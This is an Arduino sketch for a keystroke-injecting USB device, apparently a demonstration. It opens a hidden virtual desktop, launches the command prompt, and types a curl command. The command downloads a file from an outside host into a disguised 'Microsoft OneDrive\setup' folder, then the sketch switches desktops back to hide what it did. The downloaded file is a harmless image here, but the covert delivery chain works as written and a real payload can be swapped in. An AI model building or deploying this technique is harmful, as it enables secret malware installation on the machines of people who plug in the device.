#include <Keyboard.h>

void setup()
{
  //wait for device to be recogized by computer
  delay(5000);
  
  Keyboard.begin();
  
  //enable virtual desktops
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(100);

  //switch to next desktop
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_RIGHT_ARROW);
  Keyboard.releaseAll();

  delay(100);

  //open command prompt
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.println("cmd");


  delay(5000);

  //Download payload (replaced with a Spheal in this demo, but still hidden on the machine)
  Keyboard.println("curl -o \"C:\\ProgramData\\Microsoft OneDrive\\setup\\Spheal.jpg\" \"https://pkmncards.com/wp-content/uploads/sv8_en_199_std.jpg\"");
  delay(5000);

  // Return to previous desktop, keeping actions secret
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();

  // Stop Keyboard
  Keyboard.end();
}

// Unused
void loop() {}